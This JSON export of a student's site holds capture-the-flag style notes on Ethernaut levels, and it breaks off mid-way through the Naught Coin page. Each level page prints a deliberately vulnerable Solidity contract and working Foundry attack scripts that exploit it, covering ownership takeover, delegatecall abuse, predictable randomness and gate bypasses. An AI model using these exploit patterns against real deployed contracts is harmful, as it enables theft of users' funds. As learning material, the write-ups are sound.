{"/about/":{"data":{"":"","#":"Me Software engineer who lives in Paris üóºü•êüá´üá∑ü•êüá´üá∑ \u003c- (this is not me but heh)\nJob Intern at BPCE, I work on web3 R\u0026D projects. I started my blockchain journey (as something serious) a few months ago.\nPassionate about innovation, decentralization and software resilience.\nMy main focus is the Ethereum ecosystem Œû\nInterests A few things I like to do in my free time\nüõπ Skateboarding üçø Watching movies with my friends üíª Coding is a hobby too Education üéì I‚Äôm still a student at 42 School aming for a master degree in computer science."},"title":"About"},"/projects/":{"data":{"":" Here you can find some projects I have done The Ethernaut Node Guardians Crypto Zombies "},"title":"Projects"},"/projects/ethernaut/":{"data":{"":" The Ethernaut is a Web3/Solidity based wargame inspired by overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be ‚Äòhacked‚Äô. The game is 100% open source and all levels are contributions made by other players.\nHere you will find my notes on the levels I have solved. Currently, they are not meant to be read as a comprehensive guide to understanding Ethernaut levels.\nMy primary focus is on solving the levels, and these notes act as checkpoints for my understanding.\nHello Ethernaut Fallback Fal1out Coin Flip Telephone Token Delegation Force Vault King Re-entrancy Elevator Elevator Gatekeeper One Gatekeeper Two Naught Coin Preservation "},"title":"The Ethernaut"},"/projects/ethernaut/coin-flip-c27578d40d2f427d968d5623d7000dab/":{"data":{"":" This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you‚Äôll need to use your psychic abilities to guess the correct outcome 10 times in a row.\nThings that might help\nSee the \"?\" page above in the top right corner menu, section ‚ÄúBeyond the console‚Äù Here is the first version of my solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface CoinFlip { function consecutiveWins() external returns (uint256); function flip(bool _guess) external returns (bool); } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_03\"); uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; vm.startBroadcast(deployerPrivateKey); CoinFlip instance = CoinFlip(addr); for (uint i = 0; i \u003c 10; i++) { uint256 blockValue = uint256(blockhash(block.number - 1)); uint coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; instance.flip(side); console.logUint(instance.consecutiveWins()); } vm.stopBroadcast(); } } It doesn‚Äôt work because block.number doesn‚Äôt change between executionn of the loop.\nlink_preview\nIt seems that theire is on way to do this so let‚Äôs go by hand for now‚Ä¶\nHere is the forge script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface CoinFlip { function consecutiveWins() external returns (uint256); function flip(bool _guess) external returns (bool); } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_03\"); uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; vm.startBroadcast(deployerPrivateKey); CoinFlip instance = CoinFlip(addr); uint256 blockValue = uint256(blockhash(block.number - 1)); uint coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; instance.flip(side); console.logUint(instance.consecutiveWins()); vm.stopBroadcast(); } } Actually this is too complecated. So let‚Äôs build a contract that will do th attack for us with check in it so that we are sure to get a valid result.\nhere is my attacker contract:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface CoinFlip { function consecutiveWins() external returns (uint256); function flip(bool _guess) external returns (bool); } contract CoinFlipAttack { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; CoinFlip coinFlipTarget; constructor(address instanceAdrress) { coinFlipTarget = CoinFlip(instanceAdrress); consecutiveWins = 0; } function attack() public { uint256 blockValue = uint256(blockhash(block.number - 1)); if (lastHash != blockValue) { lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; coinFlipTarget.flip(side); consecutiveWins++; } } } Let‚Äôs deploy this contract :\nforge create --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY src/03.sol:CoinFlipAttack --constructor-args $INSTANCE_03 Now we can call our attack() function with cast send:\ncast send $ATTACKER_03 --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \"attack()\" We can also look up the current consecutive wins on the attacked contract using the following cast command:\ncast call $INSTANCE_03 --rpc-url $SEPOLIA_RPC_URL \"consecutiveWins()\" "},"title":"Coin Flip"},"/projects/ethernaut/delegation-0c005c8b167c4966926771bad0ff918c/":{"data":{"":" The goal of this level is for you to claim ownership of the instance you are given.\nThings that might help\nLook into Solidity‚Äôs documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope. Fallback methods Method ids // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Delegate { address public owner; constructor(address _owner) { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface Delegation { function owner() external returns(address); fallback() external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_06\"); vm.startBroadcast(deployerPrivateKey); Delegation delegation = Delegation(addr); console.logAddress(delegation.owner()); bytes memory data = abi.encodeWithSignature(\"pwn()\"); (bool result, ) = address(delegation).call(data); if (result) { } console.logAddress(delegation.owner()); vm.stopBroadcast(); } } Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying ‚Äúhere, -other contract- or -other library-, do whatever you want with my state‚Äù. Delegates have complete access to your contract‚Äôs state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.\nPlease refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD."},"title":"Delegation"},"/projects/ethernaut/elevator-59c41c694afa45c68e603000da840a2e/":{"data":{"":"","#":" title: Elevator weight: 4 type: docs next: re-entrancy prev: privacy\nLevel11 - ‚≠ê‚≠ê\nThis elevator won‚Äôt let you reach the top of your building. Right?\nThings that might help: Sometimes solidity is not good at keeping promises. This Elevator expects to be used from a Building. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Elevator { function top() external view returns(bool); function floor() external view returns(uint); function goTo(uint _floor) external; } contract Building { Elevator public elevator; bool lastFloor; function installElevator(address _elevator) public { elevator = Elevator(_elevator); } function isLastFloor(uint) public returns (bool) { if (lastFloor == false) { lastFloor = true; return false; } return true; } function attack(uint _floor) public { elevator.goTo(_floor); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Building} from \"../src/11.sol\"; interface Elevator { function top() external view returns(bool); function floor() external view returns(uint); function goTo(uint _floor) external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_11\"); vm.startBroadcast(deployerPrivateKey); console.logUint(address(addr).balance); Elevator elevator = Elevator(addr); Building building = new Building(); building.installElevator(addr); console.logBool(elevator.top()); console.logUint(elevator.floor()); building.attack(0); console.logBool(elevator.top()); console.logUint(elevator.floor()); vm.stopBroadcast(); } } You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity‚Äôs documentation and learn its caveats.\nAn alternative way to solve this level is to build a view function which returns different results depends on input data but don‚Äôt modify state, e.g. gasleft()."},"title":"Elevator"},"/projects/ethernaut/fal1out-eb9fe61a4da943248fa363e1918dd9f6/":{"data":{"":" // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import 'openzeppelin-contracts-06/math/SafeMath.sol'; contract Fallout { using SafeMath for uint256; mapping (address =\u003e uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] \u003e 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; } } We have to claim the owner ship of the program, we can see that their is nothing that seems to prevent us from calling Fal1out() so let‚Äôs try that:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface Fallout { function allocatorBalance(address allocator) external view returns (uint); function Fal1out() external payable; function allocate() external payable; function sendAllocation(address payable allocator) external; function collectAllocations() external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_02\"); console.logAddress(addr); vm.startBroadcast(deployerPrivateKey); Fallout instance = Fallout(addr); instance.Fal1out{value: 1}(); //value 1 isnot needed but just in case vm.stopBroadcast(); } } source .env forge script ./script/02.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv "},"title":"Fal1out"},"/projects/ethernaut/fallback-0f16d7ea49bd4084a635ec4d24c77563/":{"data":{"":" How to send ether when interacting with an ABI How to send ether outside of the ABI\nConverting to and from wei/ether units (see help() command)\nFallback methods\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Fallback { mapping(address =\u003e uint) public contributions; address public owner; constructor() { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function contribute() public payable { require(msg.value \u003c 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] \u003e contributions[owner]) { owner = msg.sender; } } function getContribution() public view returns (uint) { return contributions[msg.sender]; } function withdraw() public onlyOwner { payable(owner).transfer(address(this).balance); } receive() external payable { require(msg.value \u003e 0 \u0026\u0026 contributions[msg.sender] \u003e 0); owner = msg.sender; } } Call the contribute() function with a value set to 1 wei. Call senTransaction() with 1 wei also to get ownership of the contract. Call withdraw() to extract the funds from the contract. This is frustrating to using the web console to interact with the contract. So I will try to redo the challenge but using foundry this time.\nLet‚Äôs start with the same template as before but with the new contract instance address:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; interface Callee { } contract POC is Script { Callee level0 = Callee(0xCe9D58330C2623e00018a10164399238723A4F01); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); vm.stopBroadcast(); } } It is stated that we have to :\nclaim ownership of the contract reduce its balance to 0 This time it‚Äôs easier to get the contract interface since we directly have access to the contract source code.\ninterface Callee { function owner() view external returns(address); function contribute() external payable; function withdraw() external; function getContribution() external view returns (uint); } This is the corresponding interface of the function we are going to utilize.\nFrom here, everything is quite simple. After a close look at the contract source code we came with the following PoC:\ncontract POC is Script { Callee level1 = Callee(0x7f584a9D74D461eFDaD062AA9AfEe9629b96c780); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); console.logUint(level1.getContribution()); console.logAddress(level1.owner()); level1.contribute{value: 1}(); (bool sent,bytes memory data) = address(level1).call{value: 1}(\"\"); require(sent, \"Failed to sennd Ether\"); console.logBytes(data); console.logUint(level1.getContribution()); level1.withdraw(); console.logUint(level1.getContribution()); console.logAddress(level1.owner()); vm.stopBroadcast(); } } "},"title":"Fallback"},"/projects/ethernaut/force-79bc75128abc41f2b25e56b521833ab6/":{"data":{"":" Some contracts will simply not take your money ¬Ø\\_(„ÉÑ)_/¬Ø\nThe goal of this level is to make the balance of the contract greater than zero.\nThings that might help:\nFallback methods Sometimes the best way to attack a contract is with another contract. See the \"?\" page above, section ‚ÄúBeyond the console‚Äù // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =√∏= / (______)__m_m) */} üí° In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.\nHowever, there is no way to stop an attacker from sending ether to a\ncontract by self destroying. Hence, it is important not to count on the\ninvariant address(this).balance == 0 for any contract logic."},"title":"Force"},"/projects/ethernaut/gatekeeper-one-9bbda6efa6c24367aa643eb73ae92a6a/":{"data":{"":"","#":" title: Gatekeeper One weight: 13 type: docs prev: privacy next: gatekeeper-two\nLevel13 - ‚≠ê‚≠ê‚≠ê‚≠ê\nMake it past the gatekeeper and register as an entrant to pass this level.\nThings that might help: Remember what you‚Äôve learned from the Telephone and Token levels. You can learn more about the special function gasleft(), in Solidity‚Äôs documentation (see here and here). // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperOne { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { require(gasleft() % 8191 == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\"); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\"); require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\"); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker, GatekeeperOne} from \"../src/13.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address publicKey = vm.envAddress(\"PUBLIC_KEY\"); address addr = vm.envAddress(\"INSTANCE_13\"); vm.startBroadcast(deployerPrivateKey); GatekeeperOne gate = GatekeeperOne(addr); console.log('entrant = %s', gate.entrant()); Attacker attacker = new Attacker(address(gate)); // ----- bytes2 expected = bytes2(uint16(uint160(publicKey))); console.logBytes2(expected); // ----- console.logBytes20(bytes20(publicKey)); bytes8 gateKey = bytes8((uint64((uint160(publicKey) \u003c\u003c 6 * 8)) \u003e\u003e 8 * 6) + 0x0100000000000000); console.log('entrant = %s', gate.entrant()); attacker.attack(gateKey); console.log('entrant = %s', gate.entrant()); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/console.sol\"; interface GatekeeperOne { function entrant() external returns(address); function enter(bytes8 _gateKey) external returns (bool); } contract Attacker { GatekeeperOne gatekeeper; constructor(address _gatekeeper) { gatekeeper = GatekeeperOne(_gatekeeper); } function attack(bytes8 _gateKey) public { gatekeeper.enter{gas: 8191 + 24829}(_gateKey); // 24829 if found through brut force loop simulation (without --broadcast flag we can simulate execution) } } "},"title":"Gatekeeper One"},"/projects/ethernaut/gatekeeper-two-d4a070f38b644143a295ecf4467fb7fa/":{"data":{"":"","#":" This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.\nThings that might help: Remember what you‚Äôve learned from getting past the first gatekeeper - the first gate is the same. The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract‚Äôs code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper. The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } Evm op codes: https://www.evm.codes/?fork=shanghai\nSolution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,GatekeeperTwo} from \"../src/14.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_14\"); vm.startBroadcast(deployerPrivateKey); GatekeeperTwo gate = GatekeeperTwo(addr); new Attacker(address(gate)); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/console.sol\"; interface GatekeeperTwo { function enter(bytes8 _gateKey) external returns (bool); } contract Attacker { GatekeeperTwo gatekeeper; constructor(address _gatekeeper) { gatekeeper = GatekeeperTwo(_gatekeeper); bytes8 value = bytes8(keccak256(abi.encodePacked(address(this)))); bytes8 gateKey = ~value; // gateKey ^ value == type(uint64).max gatekeeper.enter(gateKey); } } "},"title":"Gatekeeper Two"},"/projects/ethernaut/hello-ethernaut-9a7c00bee0ac470faad194c59361cd05/":{"data":{"":" Here we can see the player address, do ctrl + shift + i to open your browser console.\nAfter requesting a new contract instance I got the following:\nHere is how I solved the it:\nHere is the source code after submiting the instance of the contract:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Instance { string public password; uint8 public infoNum = 42; string public theMethodName = 'The method name is method7123949.'; bool private cleared = false; // constructor constructor(string memory _password) { password = _password; } function info() public pure returns (string memory) { return 'You will find what you need in info1().'; } function info1() public pure returns (string memory) { return 'Try info2(), but with \"hello\" as a parameter.'; } function info2(string memory param) public pure returns (string memory) { if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) { return 'The property infoNum holds the number of the next info method to call.'; } return 'Wrong parameter.'; } function info42() public pure returns (string memory) { return 'theMethodName is the name of the next method.'; } function method7123949() public pure returns (string memory) { return 'If you know the password, submit it to authenticate().'; } function authenticate(string memory passkey) public { if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) { cleared = true; } } function getCleared() public view returns (bool) { return cleared; } } Let‚Äôs create a PoC using Foundry. A proof of concept (PoC) exploit is a non-harmful attack against a computer or network. PoC exploits are not meant to cause harm, but to show security weaknesses within software.\nLet‚Äôs configure Forge to deploy our PoC to the Sepolia testnet.\nSolidity scripts are like the scripts you write when working with tools like Hardhat; what makes Solidity scripting different is that they are written in Solidity instead of JavaScript, and they are run on the fast Foundry EVM backend, which provides dry-run capabilities.\nFirst thing first, we have to initialize the forge repository using the following command:\nforge init solidity-scripting Once this is done we end up with the following directory structure and git initiliazied project:\n. ‚îú‚îÄ‚îÄ .env ‚îú‚îÄ‚îÄ foundry.toml ‚îú‚îÄ‚îÄ .git ‚îú‚îÄ‚îÄ .github ‚îú‚îÄ‚îÄ .gitignore ‚îú‚îÄ‚îÄ .gitmodules ‚îú‚îÄ‚îÄ lib ‚îú‚îÄ‚îÄ README.md ‚îú‚îÄ‚îÄ script ‚îú‚îÄ‚îÄ src ‚îî‚îÄ‚îÄ test Inside the .env file, you have to configure your environment variables :\nSEPOLIA_RPC_URL=... PRIVATE_KEY=... ETHERSCAN_API_KEY=... Then, we can clean the default example code provided by forge with the following command:\nrm script/* src/* test/* Now we have settle our environment, we can start creating our Forge script.\nFollowing the documentation our script should be written inside the script folder (what a surprise)\nThe script for the first challenge, which is Hello Ethernaut, is written under the script/00.s.sol file. We will use the same naming convention for the following challenges.\nHere is the first (incomplete) version of our script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; contract PoC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); vm.stopBroadcast(); } } I‚Äôm just going to highlight the part of the documentation that are relevent in the case of this script by quoting them. Make sure you go by yourself into the documentation. Those notes are not meant to be exaustive.\nNow let‚Äôs read through the code and figure out what it actually means and does.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; Remember even if it‚Äôs a script it still works like a smart contract, but is never deployed, so just like any other smart contract written in Solidity the pragma version has to be specified.\nimport \"forge-std/Script.sol\"; Just like we may import Forge Std to get testing utilities when writing tests, Forge Std also provides some scripting utilities that we import here.\ncontract PoC is Script { We create a contract called PoC and it inherits Script from Forge Std.\nfunction run() external { By default, scripts are executed by calling the function named run, our entrypoint.\nuint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); This loads in the private key from our .env file. Note: you must be careful when exposing private keys in a .env file and loading them into programs. This is only recommended for use with non-privileged deployers or for local / test setups. For production setups please review the various wallet options that Foundry supports.\nvm.startBroadcast(deployerPrivateKey); This is a special cheatcode that records calls and contract creations made by our main script contract. We pass the deployerPrivateKey in order to instruct it to use that key for signing the transactions. Later, we will broadcast these transactions to deploy our PoC contract.","how-to-decypher-the-return-value-#How to decypher the return value ?":"Do you recall that we are supposed to return a string from our function, but here is the output we got: 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000027596f752077696c6c2066696e64207768617420796f75206e65656420696e20696e666f3128292e00000000000000000000000000000000000000000000000000\nOne way to interpret this is by using the cast tooling solution that comes with foundry:\ncast to-ascii 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000027596f752077696c6c2066696e64207768617420796f75206e65656420696e20696e666f3128292e00000000000000000000000000000000000000000000000000 which output the following result:\n'You will find what you need in info1(). A more systematic approach consist maybe to console log the result from within our script:\n... string memory result = level0.info(); console.logString(result); ... Now we have access to the logs directly within the ouput of our script:\nSo, let‚Äôs call the next function info1() don‚Äôt forget to add the info1() function to the interface as we did for info() :\ninterface Callee { function info() external pure returns (string memory); function info1() external pure returns (string memory); } We got the following logs:\nLet‚Äôs continue the process until we find something interesting‚Ä¶\nOK after several method calls we finally got the password to pass the level:\nHere is the code to get the password:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; interface Callee { function info() external pure returns (string memory); function info1() external pure returns (string memory); function info2(string calldata) external pure returns (string memory); function infoNum() external pure returns (uint8); function info42() external pure returns (string memory); function theMethodName() external pure returns (string memory); function method7123949() external pure returns (string memory); function password() external pure returns (string memory); } contract POC is Script { Callee level0 = Callee(0x1548f3154bbB9439762435f7526B6CEbB921B66B); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); string memory result = level0.info(); console.logString(result); result = level0.info1(); console.logString(result); result = level0.info2(\"hello\"); console.logString(result); uint8 numRes = level0.infoNum(); console.logUint(numRes); result = level0.info42(); console.logString(result); result = level0.theMethodName(); console.logString(result); result = level0.method7123949(); console.logString(result); result = level0.password(); console.logString(result); vm.stopBroadcast(); } } Now the last thing to do is to call the authenticate method with the correct password as parameter. With the same method we look at the abi from the js console of the browser the correct method interface:\nWe can see that there is one passKey input param and no outputs. Also, we see that the method state mutability is nonpayable.\nLet‚Äôs create the correct interface in our Callee contract interface:\ninterface Callee { //... function authenticate(string calldata) external; } and call the method from within our script:\ncontract POC is Script { Callee level0 = Callee(0x1548f3154bbB9439762435f7526B6CEbB921B66B); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); //... result = level0.password(); console.logString(result); level0.authenticate(result); vm.stopBroadcast(); } } After few seconds (this correspond to the time that the transaction get verified), we can see the following logs to the console:\n## Setting up 1 EVM. ========================== Simulated On-chain Traces: [50038] 0x1548f3154bbB9439762435f7526B6CEbB921B66B::authenticate(\"ethernaut0\") ‚îî‚îÄ ‚Üê () ========================== Chain 11155111 Estimated gas price: 117.520983462 gwei Estimated total gas used for script: 65049 Estimated amount required: 0.007644622453219638 ETH ========================== ### Finding wallets for all the necessary addresses... ## Sending transactions [0 - 0]. ‚†Å [00:00:00] [###################################################################################################################] 1/1 txes (0.0s) Transactions saved to: /home/jfrancai/repos/ethernaut/broadcast/00.s.sol/11155111/run-latest.json Sensitive values saved to: /home/jfrancai/repos/ethernaut/cache/00.s.sol/11155111/run-latest.json ## Waiting for receipts. ‚†â [00:00:54] [###############################################################################################################] 1/1 receipts (0.0s) ##### sepolia ‚úÖ [Success]Hash: 0x4fbf988e4bdb9179bc921ed3286db5adf546ba0a66fdeaea05c8e339db262973 Block: 5095792 Paid: 0.003921810816665045 ETH (47095 gas * 83.274462611 gwei) Transactions saved to: /home/jfrancai/repos/ethernaut/broadcast/00.s.sol/11155111/run-latest.json Sensitive values saved to: /home/jfrancai/repos/ethernaut/cache/00.s.sol/11155111/run-latest.json ========================== ONCHAIN EXECUTION COMPLETE \u0026 SUCCESSFUL. Total Paid: 0.003921810816665045 ETH (47095 gas * avg 83.274462611 gwei) ## Start verification for (0) contracts All (0) contracts were verified! Transactions saved to: /home/jfrancai/repos/ethernaut/broadcast/00.s.sol/11155111/run-latest.json Sensitive values saved to: /home/jfrancai/repos/ethernaut/cache/00.s.sol/11155111/run-latest.json Now you can submit the instance through the Ethernaut web interface to validate the level.\nCongrats ! You finished the first level of Ethernaut using the Foundry tool chain !ü•≥","how-to-interact-with-a-smart-contract-that-you-dont-have-the-code#How to interact with a smart contract that you don‚Äôt have the code":"In order to do that, we have to create an interface of the contract we want to interact with.\nFrom the Ethernaut guidelines we see that their is an info method available on the contract instance.\nLooking into the console, we see that there are multiple other method available.\nLet‚Äôs begin with the interface for the info method:\ninterface Callee { function info() external pure; } From what we can see in the data object from the console, the state mutability of the function is pure . But we have no idea if the function takes parameters or what is its return type.\nLet‚Äôs try to find out by expending the object:\nAnd there it is!\nThere are no inputs and one output type: a string\nSo, here is what our final interafce looks like:\ninterface Callee { function info() external pure returns (string memory); } Now, we can use this interface inside our script, create a contract instance and call the info function:\ninterface Callee { function info() external pure returns (string memory); } contract POC is Script { Callee level0 = Callee(0x1548f3154bbB9439762435f7526B6CEbB921B66B); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); level0.info(); vm.stopBroadcast(); } } Perfect, let‚Äôs run our script:\nforge script ./script/00.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv Don‚Äôt forget to source .env if you haven‚Äôt done it yet, so you can use env variable.\nCommand Breakdown:\nforge script: This is the main command indicating the use of the Forge tool for smart contract-related operations. ./script/00.s.sol: Specifies the path to the smart contract file (00.s.sol) that is to be deployed. Developers can replace this with the path to their own Solidity smart contract file. ‚Äîrpc-url $SEPOLIA_RPC_URL: Defines the RPC (Remote Procedure Call) URL, which is crucial for interacting with the blockchain network. The $SEPOLIA_RPC_URL variable holds the URL of the blockchain node or network to which the smart contract will be deployed. ‚Äîbroadcast: This flag indicates that the deployment transaction should be broadcasted to the network. Broadcasting is an essential step in the process of making the smart contract part of the blockchain. ‚Äîverify: This flag triggers a verification process, ensuring that the smart contract‚Äôs bytecode matches the one provided in the source code. Verification is a crucial step for ensuring the integrity and security of the deployed smart contract. vvvv: These flags represent the verbosity level of the output. In this case, the use of five ‚Äòv‚Äô flags (vvvv) indicates a high level of verbosity, providing detailed information about each step of the deployment process. This can be helpful for developers to closely monitor and troubleshoot the deployment. And here is the output we got:"},"title":"Hello Ethernaut"},"/projects/ethernaut/king-8338a297a2b447b3b40166c68586199d/":{"data":{"":" The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD\nSuch a fun game. Your goal is to break it.\nWhen you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract King { address king; uint public prize; address public owner; constructor() payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value \u003e= prize || msg.sender == owner); payable(king).transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address) { return king; } } üí° Most of Ethernaut‚Äôs levels try to expose (in an oversimplified form of\ncourse) something that actually happened ‚Äî a real hack or a real bug.\nIn this case, see: King of the Ether and King of the Ether Postmortem.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface King { function prize() external returns(uint); function owner() external returns(address); receive() external payable; function _king() external view returns (address); } contract TheOnlyOneKing { King fakeKing; constructor(address payable _fakeKing) { fakeKing = King(_fakeKing); } function becomeTheOnlyOneKing() public payable { uint prize = fakeKing.prize(); (bool success,) = address(fakeKing).call{value: prize}(\"\"); require(success, 'failed become the only one king'); } receive() external payable { if (fakeKing._king() != address(this)) { payable(fakeKing).transfer(msg.value); } } } This solution is overkill since we can just forbid the to send ether to a contract just by not implementing any fallback function. But this solution is more fun since it‚Äôs like TheOnlyOneKing is always fighting back for his crown ! üëë"},"title":"King"},"/projects/ethernaut/naught-coin-5013cfef45d646e693a6feaac127ac33/":{"data":{"":" NaughtCoin is an ERC20 token and you‚Äôre already holding all of them. The catch is that you‚Äôll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\nThings that might help\nThe ERC20 Spec The OpenZeppelin codebase // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import 